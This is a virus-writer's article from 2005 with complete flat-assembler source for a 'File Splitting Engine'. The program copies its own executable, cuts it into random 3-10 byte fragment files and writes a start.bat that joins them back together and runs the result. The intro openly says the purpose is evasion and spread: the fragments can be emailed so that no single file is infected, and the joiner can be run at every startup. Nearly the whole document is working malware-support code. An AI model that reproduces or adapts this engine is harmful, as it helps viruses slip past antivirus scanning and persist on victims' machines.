  File Splitting Engine
  by Second Part To Hell
  www.spth.de.vu
  spth@priest.com
  written in May-June 2005
  in Austria

  This is just a small engine, but I'm sure it could be very useful.
  What does the engine do? It splitts the current file into 3-10 byte
  parts and creates a joining file (called start.bat).

  To understand it's purpose, you should read my article called
  "Over-File Splitting".

  What could you do with the splitted files?
  - You could make an archive (via own routing, possible installed WinZIP/RAR
    or use the WinME+ preinstalled function [C:\WINDOWS\System32\zipfldr.dll,-10195]
    to compress files.) This file now could be send out via eMail.
    The advantage: No file is infected with an virus - but all together they are.

  - You could save all files in a directory (Windir, system32, whatever), and
    call the joining file every startup. What may happen? Virus/Worm works at
    the computer, but no file is infected :)

  - You could think of your own way to use this technique. Lazy ass :)


  How to compile:
  - Delete this intro
  - Use flat assembler 1.56

  Now: Much fun with it :)

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; [File Splitting Engine] ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
include '..\FASM\INCLUDE\win32ax.inc'

.data
	c_file_name	dd 0x0
	c_file_rnd_name: times 8 db 0x0
				 db '.tmp',0
	c_file_handle	dd 0x0
	c_file_size	dd 0x0
	c_map_handle	dd 0x0
	c_map_pointer	dd 0x0

	compain_name	db 'start.bat',0
	compain_data	dd 0x0
	compain_pointer dd 0x0
	compain_start	db 'copy '
	compain_handle	dd 0x0

	split_handle	dd 0x0
	split_counter	db 0x0

	rand_name_buffer: times 8 db 0x0
	rnd_file_name: times 8 db 0x0
			       db '.tmp',0
	ZERO_field	dd 0x0

systemtime_struct:	       ; for random number
	  dw 0		       ; wYear
	  dw 0		       ; wMonth
	  dw 0		       ; wDayOfWeek
	  dw 0		       ; wDay
	  dw 0		       ; wHour
	  dw 0		       ; wMinute
	  dw 0		       ; wSecond
rnd:	  dw 0		       ; wMilliseconds

.code
   start:
	invoke	GetCommandLine
	inc	eax			; Delete first "

	mov	ebx, eax		; Save eax

    get_my_name:
	inc	ebx			; Get next letter
	cmp	byte [ebx], '.' 	; Compare with '.'
    jne get_my_name

	mov	byte [ebx+4], 0x0	; Delete the second "
	mov	[c_file_name], eax	; Save the pointer

	invoke	DeleteFile, compain_name	; Delete the old compainer-file the file

	mov	ebp, 0xAAAAAAAA 		; Influences the random engine
	call	random_name			; random name in rnd_file_name

	mov	esi, rnd_file_name		; From: random-name buffer
	mov	edi, c_file_rnd_name		; To: Buffer for this copy of the file
	mov	ecx, 8				; How much: 8 letters
	rep	movsb				; Copy string

	invoke	CopyFile, [c_file_name], c_file_rnd_name, FALSE     ; Copies the current file to a .tmp

	invoke	CreateFile, c_file_rnd_name, GENERIC_READ or GENERIC_WRITE, 0x0, 0x0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0x0 	   ; Open own file
	mov	[c_file_handle], eax							  ; Save the file handle

	invoke	GetFileSize, [c_file_handle], c_file_size				  ; Get the size of the file
	mov	[c_file_size], eax							  ; Low Filesize returned in eax

	invoke	CreateFileMapping, [c_file_handle], 0x0, PAGE_READWRITE, 0x0, [c_file_size], 0x0    ; Create a Map
	mov	[c_map_handle], eax								    ; Save the Map handle

	invoke	MapViewOfFile, [c_map_handle], FILE_MAP_WRITE, 0x0, 0x0, [c_file_size]		  ; Map view of file
	mov	[c_map_pointer], eax								  ; Save the pointer of file

	invoke	VirtualAlloc, 0x0, 0x120000, 0x1000, 0x4	; Reserve Space in Memory
	mov	[compain_data], eax				; Save the pointer to it.
	mov	[compain_pointer], eax				; Save again

	mov	esi, compain_start				; What to write
	mov	edi, [compain_pointer]				; Where to write
	mov	ecx, 5						; How much to write
	rep	movsb						; Write!

	add	[compain_pointer], 5				; Get next empty byte to write

    main_loop:
	mov	ebp, 0xAAAAAAAA 		; Influences the random engine
	call	random_name			; random name in rnd_file_name

	invoke	CreateFile, rnd_file_name, GENERIC_READ or GENERIC_WRITE, 0x0, 0x0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0x0
	cmp	eax, INVALID_HANDLE_VALUE		; If file already existed
	je	main_loop				; then get a new file-name

	mov	[split_handle], eax			; Save the file-handle

	call	random_number				; Get random number
	xor	eax, eax				; eax=0
	mov	al, [rand_name_buffer]			; al~=random
	and	al, 7					; al= 0000 0???
	add	al, 3					; At least three byte
	mov	[split_counter], al			; Save that bytes

	sub	[c_file_size], eax			; Decrease the bytes to write

	invoke	WriteFile, [split_handle], [c_map_pointer], eax, ZERO_field, 0x0       ; Write (1..8) byte
	invoke	CloseHandle, [split_handle]		; Close the file

	xor	eax, eax
	mov	al, [split_counter]			; How many bytes written
	add	[c_map_pointer], eax			; Add the pointer - write the next few bytes next time

	mov	esi, rnd_file_name			; From: Filename-buffer
	mov	edi, [compain_pointer]			; To: compainer-pointer
	mov	ecx, 12 				; 8+strlen('.tmp')
	rep	movsb					; Write!

	add	[compain_pointer], 12			; Add 12 to pointer

	mov	eax, [compain_pointer]			; Pointer to eax

	mov	byte [eax], '+' 			; Move '+' to the code's memory
	inc	[compain_pointer]			; Increase the pointer

	cmp	[c_file_size], 0			; Compare if more bytes to write
    jg	main_loop					; If yes, jmp to main_loop

	invoke	UnmapViewOfFile, [c_map_pointer]	; Unmap View of File
	invoke	CloseHandle, [c_map_handle]		; Close Map
	invoke	CloseHandle, [c_file_handle]		; Close File

	invoke	DeleteFile, c_file_rnd_name		; Delete the temporary copy of the current file

	invoke	CreateFile, compain_name, GENERIC_READ or GENERIC_WRITE, 0x0, 0x0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0x0
	mov	[compain_handle], eax


	mov	eax, [compain_pointer]		; eax=pointer
	dec	eax				; Delete the last '+'
	mov	byte [eax], 0x20		; Add a space
	inc	[compain_pointer]		; Increase pointer again

	mov	ebp, 0xAAAAAAAA 		; Influences the random engine
	call	random_name			; random name in rnd_file_name

	mov	eax, rnd_file_name		; RND-pointer in eax
	add	eax, 8				; add 8 to pointer (='.' of filename)
	mov	dword [eax], '.exe'		; instate of '.tmp', '.exe'

	dec	[compain_pointer]
	mov	esi, rnd_file_name		; From: rnd_file_name
	mov	edi, [compain_pointer]		; To: compainter_pointer
	mov	ecx, 12 			; How much: 12 bytes
	rep	movsb				; Write

	add	[compain_pointer], 12		; Add 12, to get the end again
	mov	eax, [compain_pointer]		; eax=pointer to content
	mov	word [eax], 0x0A0D		; Next Line
	add	[compain_pointer], 2

	mov	esi, rnd_file_name		; From: rnd_file_name
	mov	edi, [compain_pointer]		; To: compainter_pointer
	mov	ecx, 12 			; How much: 12 bytes
	rep	movsb				; Write

	add	[compain_pointer], 12		; Add 12, to get the end again


	mov	eax, [compain_data]
	sub	[compain_pointer], eax

	invoke	WriteFile, [compain_handle], [compain_data], [compain_pointer], ZERO_field, 0x0       ; Write the file

	invoke	CloseHandle, [compain_handle]

	invoke	ExitProcess, 0x0

random_number:
	pop	edi				; Get value of stack
	push	edi				; Back to the stack
	mov	ecx, 8				; ecx=counter
	mov	dh, 0xAA			; dh: changes in the function and makes the number little bit more random
	mov	dl, 0x87			; same as dh
   random_name_loop:
	push	dx				; Save dx at stack
	push	ecx				; Save counter at stack
	call	random_byte			; Random number in al
	pop	ecx				; get counter
	xor	al, cl				; Counter influences pseudo random number
	pop	dx				; Get dx
	push	ecx
	xor	dx, cx				; Counter influences influncing number
	add	dh, al				; Random number influences influencing number
	sub	dl, al				; Same as dh
	neg	dl				; Neg dl
	xor	dl, dh				; dl XOR dh -> more variability
	xor	al, dl				; random number changes
	sub	ax, di				; value of stack influences random number
	add	ax, dx				; ax+dx
	mov	dl, [rand_name_buffer+ecx-2]
	mov	dh, [rand_name_buffer+ecx-3]	; dx=???? ???? ????? ?????
	sub	al, dl				; al-=dl
	add	al, dh				; al+=dh
	mov	ah, dl				; ah=dl
	push	ax				; AX to stack
	mov	cl, 1				; cl=1
	or	dh, cl				; dh is at least 1 (to reduce chance of result=zero)
	mul	dh				; AL=AX*DH
	pop	cx				; CX=old AX
	push	cx				; To stack again
	add	cl, al				; CL+=AL
	sub	cl, ah				; CL-=AH
	xchg	al, cl				; AL=CL
	mov	cx, bp				; cx=bp
	mul	cl				; AX=AL*CL
	neg	ah				; NEG AH
	xor	al, ah				; xor AL and AH
	pop	cx				; get old AX
	sub	cl, al				; SUB
	add	cl, dl				; cl+=old random number
	sub	al, cl				; al ~=random :)
	pop	ecx				; Get counter
	mov	[rand_name_buffer+ecx-1], al	; Save random letter
   loop random_name_loop
ret



random_name:
	call	random_number			; Get 8 random bytes
	mov	ecx, 8				; counter=8, as we want to do it 8 times

   changetoletter:
	mov	al, [rand_name_buffer+ecx-1]	; Get a letter
	mov	bl, 10				; BL=10
	xor	ah, ah				; AX: 0000 0000 ???? ????
	div	bl				; AL=rnd/10=number between 0 and 25
	add	al, 97				; Add 97 for getting lowercase letters
	mov	[rnd_file_name+ecx-1], al	; Save random letter
   loop changetoletter
ret

random_byte:
	invoke	GetSystemTime, systemtime_struct	; Get first number
	mov	ebx, [rnd-2]				; ebx=number
	add	ebx, edx				; Making it pseudo-independent of time
	sub	ebx, ecx
	xor	ebx, eax
	xchg	bl, bh
	pop	ecx
	push	ecx
	neg	ebx
	xor	ebx, ecx				; ebx=pseudo-indepentend number

	invoke	GetTickCount				; Get second number
	xor	eax, ecx				; eax=number
	neg	ax					; Making it pseudo-independent of time
	xor	eax, edx
	xor	ah, al
	sub	eax, ebp
	add	eax, esi				; eax=pseudo-indepentend number

	xor	eax, ebx				; Compain the numbers -> eax
	mov	ebx, eax				; Save eax
	shr	eax, 8					; e-part -> ax
	xor	ax, bx
	xor	al, ah					; al=number
ret
.end start